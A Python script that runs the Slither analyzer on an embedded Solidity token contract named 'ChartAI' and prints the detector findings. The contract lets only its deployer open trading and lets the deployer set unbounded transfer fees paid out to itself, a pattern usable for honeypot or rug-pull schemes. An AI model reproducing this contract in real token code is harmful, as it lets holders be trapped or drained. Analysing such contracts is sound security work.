import subprocess

# Path to the Solidity file
solidity_file = "C:/Users/aaron/myproject/myproject/temp.sol"



def parse_slither_output(output):
    # Split the output by newlines
    lines = output.split("\n")
    # Initialize a variable to store the extracted information
    extracted_info = ""
    # Flag to indicate we are in a relevant section
    capturing = False
    # Iterate through each line of the output
    for line in lines:
        # Check if the line contains the start of a relevant section
        if "INFO:Detectors:" in line:
            capturing = True  # Start capturing
            extracted_info += line + "\n"  # Capture the heading
        elif "INFO:" in line and "Detectors:" not in line:
            capturing = False  # Stop capturing on reaching another INFO line that is not a detector
        elif capturing:
            # Capture all lines within a relevant section
            extracted_info += line + "\n"
    return extracted_info


def security_check(output):
    # Open the file in write mode ('w')
    with open(solidity_file, 'w') as file:
        # Write the string to the file
        file.write(output)
    # Run Slither programmatically and capture the output
    process = subprocess.Popen(f"slither {solidity_file}", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    stdout, stderr = process.communicate()

    # Check and print standard output and error
    slither_error = stderr.decode()

    # Extract relevant information from the Slither output
    extracted_info = parse_slither_output(slither_error)

    return extracted_info


wow = '''
// SPDX-License-Identifier: unlicense
pragma solidity ^0.8.23;

interface IUniswapV2Router02 {
        function swapExactTokensForETHSupportingFeeOnTransferTokens(
            uint amountIn,
            uint amountOutMin,
            address[] calldata path,
            address to,
            uint deadline
            ) external;
        }
        
    contract ChartAI {
        string public constant name = "ChartAI";  //
        string public constant symbol = "CX";  //
        uint8 public constant decimals = 18;
        uint256 public constant totalSupply = 1_000_000_000 * 10**decimals;

        uint256 BurnTNumber = 2;
        uint256 ConfirmTNumber = 1;
        uint256 constant swapAmount = totalSupply / 100;

        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;
            
        error Permissions();
            
        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed owner,
            address indexed spender,
            uint256 value
        );
            

        address private pair;
        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
        address payable constant deployer = payable(address(0xc76AcF50761d8b72099E6DdB35D7291A3EE36487)); //

        bool private swapping;
        bool private TradingOpenStatus;

        constructor() {
            balanceOf[msg.sender] = totalSupply;
            allowance[address(this)][routerAddress] = type(uint256).max;
            emit Transfer(address(0), msg.sender, totalSupply);
        }

         receive() external payable {}

        function approve(address spender, uint256 amount) external returns (bool){
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transfer(address to, uint256 amount) external returns (bool){
            return _transfer(msg.sender, to, amount);
        }

        function transferFrom(address from, address to, uint256 amount) external returns (bool){
            allowance[from][msg.sender] -= amount;        
            return _transfer(from, to, amount);
        }

        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            require(TradingOpenStatus || from == deployer || to == deployer);

            if(!TradingOpenStatus && pair == address(0) && amount > 0)
                pair = to;

            balanceOf[from] -= amount;

            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
                swapping = true;
                address[] memory path = new  address[](2);
                path[0] = address(this);
                path[1] = ETH;
                _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                    );
                deployer.transfer(address(this).balance);
                swapping = false;
                }

            if(from != address(this)){
                uint256 FinalFigure = amount * (from == pair ? BurnTNumber : ConfirmTNumber) / 100;
                amount -= FinalFigure;
                balanceOf[address(this)] += FinalFigure;
            }
                balanceOf[to] += amount;
                emit Transfer(from, to, amount);
                return true;
            }

        function OpenTrade() external {
            require(msg.sender == deployer);
            require(!TradingOpenStatus);
            TradingOpenStatus = true;        
            }
            
        function setCX(uint256 newTBurn, uint256 newTConfirm) external {
        if(msg.sender == deployer){
            BurnTNumber = newTBurn;
            ConfirmTNumber = newTConfirm;
            }
        else{
            require(newTBurn < 10);
            require(newTConfirm < 10);
            revert();
            }  
        }
        }
''' 

print(security_check(wow))